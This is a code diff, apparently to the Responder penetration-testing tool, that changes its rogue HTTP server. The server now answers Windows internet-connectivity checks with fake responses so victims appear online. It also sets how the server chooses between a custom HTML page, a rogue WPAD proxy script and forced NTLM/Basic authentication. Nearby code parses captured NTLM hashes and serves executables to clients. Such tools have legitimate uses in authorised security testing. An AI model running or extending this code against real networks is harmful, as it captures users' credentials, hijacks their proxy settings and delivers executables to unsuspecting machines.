@@ -21,7 +21,7 @@ from utils import *
 
 from packets import NTLM_Challenge
 from packets import IIS_Auth_401_Ans, IIS_Auth_Granted, IIS_NTLM_Challenge_Ans, IIS_Basic_401_Ans,WEBDAV_Options_Answer
-from packets import WPADScript, ServeExeFile, ServeHtmlFile
+from packets import WPADScript, ServeExeFile, ServeHtmlFile, MSFTNCSI, MSFTCONNECTTEST
 
 
 # Parse NTLMv1/v2 hash.
@@ -177,15 +177,49 @@ def PacketSequence(data, client, Challenge):
 	NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
 	Basic_Auth = re.findall(r'(?<=Authorization: Basic )[^\r]*', data)
 
+	# simulate internet connectivity
+	if settings.Config.Serve_Html_Simulate_Internet:
+		# ToDo: Add more connectivity tests (iOS, OSX, Android)
+
+		# Win7 check if "http://www.msftncsi.com/ncsi.txt" is requested
+		if re.search(r'(/ncsi.txt HTTP)', data) and re.search(r'(www.msftncsi.com)', data):
+			print text("[HTTP] Serving MSFTNCSI to %s" % client)
+			Buffer = MSFTNCSI()
+			# Buffer.calculate()
+			return str(Buffer)
+		# Win10 check if "http://www.msftconnecttest.com/connecttest.txt" is requested
+		if re.search(r'(/connecttest.txt HTTP)', data) and re.search(r'(www.msftconnecttest.com)', data):
+			print text("[HTTP] Serving MSFTCONNECTTEST to %s" % client)
+			Buffer = MSFTCONNECTTEST()
+			# Buffer.calculate()
+			return str(Buffer)
+
+
 	# Serve the .exe if needed
 	if settings.Config.Serve_Always is True or (settings.Config.Serve_Exe is True and re.findall('.exe', data)):
 		return RespondWithFile(client, settings.Config.Exe_Filename, settings.Config.Exe_DlName)
 
-	# Serve the custom HTML if needed
-	if settings.Config.Serve_Html:
-		return RespondWithFile(client, settings.Config.Html_Filename)
-
+	# ToDo: WPAD_Custom should only be set if 'WPADScript' is provided in config, but
+	#	omitting 'WPADScript' isn't allowed and crashes Responder's ConfigParser
 	WPAD_Custom = WpadCustom(data, client)
+
+	# Serve the custom HTML file if needed, keep wpad.dat delivery if configured
+	if settings.Config.Serve_Html:
+		# if Serve_Html_Provide_WPAD_Anyway is enabled, but Force_WPAD_Auth disabled we provide customWPAD
+		# if Serve_Html_Provide_WPAD_Anyway is enabled and Force_WPAD_Auth enabled we provide nothing
+		# to pass execution to NTLM_auth/BASIC_auth
+		if re.search(r'(/wpad.dat|/*\.pac)', data) and settings.Config.Serve_Html_Provide_WPAD_Anyway:
+			if not settings.Config.Force_WPAD_Auth:
+				if WPAD_Custom: # custom WPAD available (Note: not realy optional, see comment on WPAD_Custom)
+					return WPAD_Custom
+				else: # custom WPAD not available, provide HTML file (never reached, see comment on WPAD_Custom)
+					return RespondWithFile(client, settings.Config.Html_Filename)
+			# else: 'Force_WPAD_Auth' set, pass execution to NTLM_auth/BASIC_auth (do nothing here)
+
+		# Serve_Html_Provide_WPAD_Anyway is disabled or not a request to wpad.dat serve HTML file
+		else:
+			return RespondWithFile(client, settings.Config.Html_Filename)
+
         # Webdav
         if ServeOPTIONS(data):
                 return ServeOPTIONS(data)
